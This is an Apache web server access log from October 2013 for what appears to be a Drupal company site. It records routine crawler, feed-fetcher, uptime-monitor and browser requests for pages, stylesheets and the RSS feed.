209.85.238.70 - - [14/Oct/2013:07:39:04 +0200] "GET /rss.xml HTTP/1.1" 200 2983 "-" "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 3 subscribers; feed-id=7225077890218036057)"
123.125.71.59 - - [14/Oct/2013:07:43:01 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
220.181.108.102 - - [14/Oct/2013:07:44:57 +0200] "GET / HTTP/1.1" 200 16060 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.5.110 - - [14/Oct/2013:07:46:09 +0200] "GET /node/88?lang=en HTTP/1.1" 200 6615 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
5.63.145.68 - - [14/Oct/2013:07:46:39 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
5.10.83.11 - - [14/Oct/2013:07:56:08 +0200] "GET /node/79 HTTP/1.1" 200 6640 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.63.145.68 - - [14/Oct/2013:08:03:36 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
54.241.196.227 - - [14/Oct/2013:08:07:27 +0200] "GET /rss.xml HTTP/1.1" 200 2945 "-" "Digg Feed Fetcher 1.0 (Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_1) AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3)"
66.249.66.213 - - [14/Oct/2013:08:10:10 +0200] "GET /sites/all/themes/hurence/css/views-styles.css?ls5cse HTTP/1.1" 200 390 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.63.145.68 - - [14/Oct/2013:08:19:11 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
5.10.83.11 - - [14/Oct/2013:08:22:31 +0200] "GET /node/131?lang=fr HTTP/1.1" 200 7139 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
140.168.135.1 - - [14/Oct/2013:08:23:58 +0200] "GET /sites/all/themes/hurence/css/comments.css?ls5cse HTTP/1.1" 304 213 "-" "Mozilla/4.0 (compatible;)"
66.249.66.213 - - [14/Oct/2013:08:25:51 +0200] "GET /sites/all/themes/hurence/css/pages.css?ls5cse HTTP/1.1" 200 2220 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
209.85.238.70 - - [14/Oct/2013:08:29:44 +0200] "GET /rss.xml HTTP/1.1" 200 2983 "-" "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 3 subscribers; feed-id=7225077890218036057)"
5.10.83.11 - - [14/Oct/2013:08:30:01 +0200] "GET /node/98?lang=fr HTTP/1.1" 200 6699 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
5.63.145.68 - - [14/Oct/2013:08:34:36 +0200] "HEAD / HTTP/1.1" 200 468 "-" "checks.panopta.com"
81.52.143.34 - - [14/Oct/2013:08:40:18 +0200] "GET /node/54?lang=fr HTTP/1.1" 200 7032 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)"
83.26.31.99 - - [14/Oct/2013:08:41:01 +0200] "GET /node/3 HTTP/1.1" 200 6679 "http://www.hurence.com/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0"
